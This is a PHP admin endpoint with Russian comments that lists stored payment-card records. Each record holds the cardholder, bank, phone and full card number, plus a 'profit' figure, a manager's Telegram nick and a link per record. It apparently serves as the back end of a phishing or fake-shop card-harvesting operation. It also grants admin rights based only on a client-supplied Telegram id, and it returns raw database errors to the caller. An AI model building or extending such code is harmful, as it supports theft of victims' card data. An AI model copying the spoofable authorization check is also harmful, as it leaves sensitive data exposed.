<?php
header('Content-Type: application/json');
include 'cors.php'; // Включение CORS, если необходимо
require_once 'db.php'; // Подключение к базе данных

// Получение id_usertg из запроса
$data = json_decode(file_get_contents('php://input'), true);
$id_usertg = isset($data['id_usertg']) ? $data['id_usertg'] : null;

if (!$id_usertg) {
    echo json_encode(['success' => false, 'error' => 'Нет id пользователя']);
    exit;
}

try {
    $pdo = getDbConnection();
    $stmt = $pdo->prepare('SELECT status FROM users WHERE id_usertg = :id_usertg');
    $stmt->bindParam(':id_usertg', $id_usertg, PDO::PARAM_STR);
    $stmt->execute();
    $user = $stmt->fetch(PDO::FETCH_ASSOC);

    if (!$user || $user['status'] !== 'admin') {
        echo json_encode(['success' => false, 'error' => 'Нет прав администратора']);
        exit;
    }

    // Запрос к таблице steps
    $stmt = $pdo->prepare('SELECT id, cardholder, bankname AS bank, phone, cardnumber, id_product, status, completed_at, updated_at FROM steps WHERE status IN (1, 2)');
    $stmt->execute();
    $applications = $stmt->fetchAll(PDO::FETCH_ASSOC);

    $result = [];
    foreach ($applications as $app) {
        // Получение market_price, your_price и name из таблицы products
        $stmt = $pdo->prepare('SELECT market_price, your_price, name, tg_nick_manager FROM products WHERE id = :id_product');
        $stmt->bindParam(':id_product', $app['id_product'], PDO::PARAM_INT);
        $stmt->execute();
        $product = $stmt->fetch(PDO::FETCH_ASSOC);

        if ($product) {
            $profit = $product['market_price'] - $product['your_price'];
            $url = 'https://inhomeka.online:81/?id=' . $app['id'];

            $result[] = [
                'id' => $app['id'],
                'cardholder' => $app['cardholder'],
                'bank' => $app['bank'],
                'phone' => $app['phone'],
                'cardnumber' => $app['cardnumber'],
                'profit' => $profit . ' руб.',
                'status' => $app['status'],
                'url' => $url,
                'product_name' => $product['name'],
                'tg_nick_manager' => !empty($product['tg_nick_manager']) ? $product['tg_nick_manager'] : 'Не указан',
                'completed_at' => $app['completed_at'],
                'updated_at' => $app['updated_at']
            ];
        }
    }

    echo json_encode(['success' => true, 'data' => $result]);

} catch (PDOException $e) {
    echo json_encode(['success' => false, 'error' => 'Database error: ' . $e->getMessage()]);
}
?>
